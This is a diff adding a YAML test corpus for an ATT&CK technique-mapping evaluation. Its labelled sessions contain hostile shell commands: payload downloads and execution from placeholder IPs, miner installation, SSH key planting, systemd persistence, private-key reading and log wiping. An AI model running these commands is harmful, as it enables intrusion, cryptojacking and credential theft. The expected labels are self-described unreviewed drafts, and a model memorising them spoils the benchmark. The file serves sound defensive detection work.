@@ -1,0 +1,157 @@
+# Labelled sessions for scripts/mapping_eval.py: commands -> the ATT&CK techniques a
+# careful analyst would assign, restricted to the pinned 21-technique catalog
+# (app/services/mitre). A command whose correct technique is NOT in the catalog is
+# left unlabelled rather than forced onto the nearest id -- e.g. `history -c`
+# (T1070.003) and `systemctl list-units` (T1007).
+#
+# STATUS: DRAFT LABELS, written by an AI assistant on 2026-10-12. They are a
+# starting point, not ground truth. Before any number from this corpus goes into a
+# report or paper, the team must review every label and own it; a benchmark whose
+# answer key was drafted by a model is exactly the circularity this project exists
+# to avoid. Record who reviewed it here when that is done.
+#
+# `origin: seed` cases are the seed corpus the rulebook was written against, so the
+# rulebook's recall on them is inflated by construction. `origin: heldout` cases
+# were written for this file and never seen by the rules. Report the two apart.
+#
+# Unlabelled-on-purpose: `expected: []` cases are text that MENTIONS a trigger
+# without executing it. Any technique predicted there is a false positive.
+
+cases:
+  - id: seed-botnet-01
+    origin: seed
+    commands:
+      - uname -a
+      - cat /proc/cpuinfo
+      - free -m
+      - cd /tmp
+      - wget http://198.51.100.7/malicious_script
+      - chmod 777 malicious_script
+      - sh malicious_script
+    expected: [T1082, T1105, T1222.002, T1059.004]
+
+  - id: seed-miner-01
+    origin: seed
+    commands:
+      - nproc
+      - wget https://raw.githubusercontent.com/c3pool/xmrig_setup/master/setup_c3pool_miner.sh
+      - sh setup_c3pool_miner.sh 4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP
+      - echo -e "hacked123" | passwd
+    expected: [T1082, T1105, T1059.004, T1496, T1531]
+
+  - id: seed-recon-01
+    origin: seed
+    commands:
+      - ls -la
+      - cat /etc/os-release
+      - ps aux
+      - netstat -tulpn
+      - uptime
+    expected: [T1083, T1082, T1057, T1049]
+
+  - id: seed-persist-01
+    origin: seed
+    commands:
+      - id
+      - cd home && rm -rf .ssh
+      - mkdir .ssh
+      - echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7attacker" >> .ssh/authorized_keys
+      - chmod -R go= home/.ssh && cd home
+    expected: [T1033, T1070.004, T1098.004, T1222.002]
+
+  - id: seed-unmapped-01
+    origin: seed
+    commands:
+      - dmidecode -s system-manufacturer
+      - cat /sys/class/dmi/id/product_name
+      - ip route show default
+      - systemctl list-units --type=service --state=running
+    expected: [T1082, T1016]
+
+  - id: heldout-network-recon
+    origin: heldout
+    commands:
+      - ifconfig
+      - ip a
+      - cat /etc/resolv.conf
+      - route -n
+    expected: [T1016]
+
+  - id: heldout-account-enum
+    origin: heldout
+    commands:
+      - cat /etc/group
+      - getent passwd
+      - lastlog
+    expected: [T1087.001]
+
+  - id: heldout-software-discovery
+    origin: heldout
+    commands:
+      - dpkg -l
+      - which python3 perl gcc
+    expected: [T1518]
+
+  - id: heldout-systemd-persistence
+    origin: heldout
+    commands:
+      - printf '[Service]\nExecStart=/tmp/.x\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/dbus-helper.service
+      - systemctl enable dbus-helper.service
+      - systemctl start dbus-helper.service
+    expected: [T1543.002]
+
+  - id: heldout-private-keys
+    origin: heldout
+    commands:
+      - find / -name id_rsa 2>/dev/null
+      - cat /root/.ssh/id_rsa
+    expected: [T1552.004, T1083]
+
+  - id: heldout-remote-discovery
+    origin: heldout
+    commands:
+      - cat /etc/hosts
+      - arp -a
+    expected: [T1018]
+
+  - id: heldout-collection
+    origin: heldout
+    commands:
+      - tar czf /tmp/.d.tgz /home /etc
+    expected: [T1005]
+
+  - id: heldout-curl-miner
+    origin: heldout
+    commands:
+      - curl -o /tmp/.x http://203.0.113.5/xmrig
+      - chmod +x /tmp/.x
+      - /tmp/.x -o pool.minexmr.com:4444 --donate-level 1
+    expected: [T1105, T1222.002, T1496]
+
+  - id: heldout-log-wipe
+    origin: heldout
+    commands:
+      - unset HISTFILE
+      - history -c
+      - rm -rf /var/log/wtmp /var/log/lastlog
+    expected: [T1070.004]
+
+  - id: heldout-discovery-variants
+    origin: heldout
+    commands:
+      - ps -ef | grep -v grep
+      - ss -tunap
+    expected: [T1057, T1049]
+
+  - id: heldout-password-change
+    origin: heldout
+    commands:
+      - echo "root:Xk92!lq" | chpasswd
+    expected: [T1531]
+
+  - id: heldout-mentions-only
+    origin: heldout
+    commands:
+      - echo "to update run wget http://example.com/update.sh"
+      - "# chmod 777 /tmp/x && sh /tmp/x"
+    expected: []
